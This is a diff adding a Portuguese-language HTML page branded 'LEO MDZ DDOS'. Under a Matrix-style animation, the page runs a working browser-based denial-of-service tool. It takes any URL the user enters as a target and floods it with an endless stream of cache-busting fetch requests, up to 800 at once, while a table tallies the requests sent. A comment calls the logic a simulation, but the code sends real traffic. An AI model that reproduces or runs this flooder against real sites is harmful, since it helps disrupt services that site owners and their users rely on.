@@ -1,0 +1,252 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WEB SYSTEM DDOS @LEO MODZ</title>
+    <style>
+        /* Matrix Canvas */
+        #matrixCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            width: 100%;
+            height: 100%;
+            background: black;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: transparent;
+            color: #00ff00;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Central container */
+        #controls-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%;
+            max-width: 600px;
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.4);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px #0f0;
+        }
+
+        h1 {
+            color: #00ff00;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"] {
+            width: 80%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            border: 1px solid #00ff00;
+            background-color: black;
+            color: #0f0;
+            text-align: center;
+        }
+
+        button {
+            width: 60%;
+            padding: 12px;
+            margin: 10px auto;
+            display: block;
+            border: none;
+            background-color: #00aa00;
+            color: white;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #007700;
+        }
+
+        #stats {
+            width: 90%;
+            max-width: 800px;
+            margin: 40px auto;
+            background-color: rgba(0, 0, 0, 0.4);
+            color: #0f0;
+            border-radius: 10px;
+            padding: 10px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        thead {
+            background-color: #0056b3;
+            color: white;
+        }
+
+        th, td {
+            text-align: left;
+            padding: 12px;
+            border-bottom: 1px solid #333;
+        }
+
+        tr:nth-child(even) {
+            background-color: rgba(0, 255, 0, 0.05);
+        }
+
+        tr:hover {
+            background-color: rgba(0, 255, 0, 0.1);
+        }
+    </style>
+</head>
+<body>
+    <canvas id="matrixCanvas"></canvas>
+
+    <div id="controls-container">
+        <h1>LEO MDZ DDOS</h1>
+        <input type="text" id="urlInput" placeholder="DIGITE A URL PARA ATACAR">
+        <button id="startBtn">INICIAR ATACK</button>
+        <button id="stopBtn" disabled="">PARAR ATACK</button>
+    </div>
+
+    <div id="stats"></div>
+
+    <!-- Matrix effect -->
+    <script>
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const letters = 'アァイィウヴエカキクケコサシスセソタチツテトナニヌネノABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        const fontSize = 16;
+        const columns = Math.floor(canvas.width / fontSize);
+        const drops = Array(columns).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = '#0F0';
+            ctx.font = fontSize + 'px monospace';
+
+            for (let i = 0; i < drops.length; i++) {
+                const char = letters[Math.floor(Math.random() * letters.length)];
+                ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+
+                drops[i]++;
+            }
+        }
+
+        setInterval(drawMatrix, 33);
+
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+    </script>
+
+    <!-- Simulação de lógica (cuidado com uso real) -->
+    <script>
+        var targets = {
+            '': { number_of_requests: 0, number_of_errored_responses: 0 },
+        };
+
+        var statsEl = document.getElementById('stats');
+        var attackRunning = false;
+        var targetUrl = '';
+        var floodPromise = null;
+
+        function printStats() {
+            statsEl.innerHTML = '<table><thead><tr><th>WEB</th><th>NÚMERO DE PEDIDOS</th><th>NÚMERO DE BYTES</th></tr></thead><tbody>' +
+                Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses }]) =>
+                    '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>';
+        }
+        setInterval(printStats, 1000);
+
+        const CONCURRENCY_LIMIT = 800;
+        var queue = [];
+
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                mode: 'no-cors',
+                signal: controller.signal
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+
+        async function flood(target) {
+            for (var i = 0;; ++i) {
+                if (queue.length >= CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+                var rand = i % 3 === 0 ? '' : ('?' + Math.random() * 28000);
+                queue.push(
+                    fetchWithTimeout(target + rand, { timeout: 1000 })
+                        .catch((error) => {
+                            targets[target].number_of_errored_responses++;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                targets[target].number_of_errored_responses++;
+                            }
+                            targets[target].number_of_requests++;
+                        })
+                );
+            }
+        }
+
+        function startFlood(target) {
+            if (!attackRunning) {
+                attackRunning = true;
+                targets[target] = { number_of_requests: 0, number_of_errored_responses: 0 };
+                floodPromise = flood(target);
+            }
+        }
+
+        function stopFlood() {
+            if (attackRunning) {
+                attackRunning = false;
+                queue = [];
+                targets = { '': { number_of_requests: 0, number_of_errored_responses: 0 } };
+            }
+        }
+
+        document.getElementById('startBtn').addEventListener('click', () => {
+            const url = document.getElementById('urlInput').value;
+            if (url) {
+                targetUrl = url;
+                startFlood(targetUrl);
+                document.getElementById('stopBtn').disabled = false;
+                document.getElementById('startBtn').disabled = true;
+            }
+        });
+
+        document.getElementById('stopBtn').addEventListener('click', () => {
+            stopFlood();
+            document.getElementById('stopBtn').disabled = true;
+            document.getElementById('startBtn').disabled = false;
+        });
+    </script>
+
+
+</body></html>
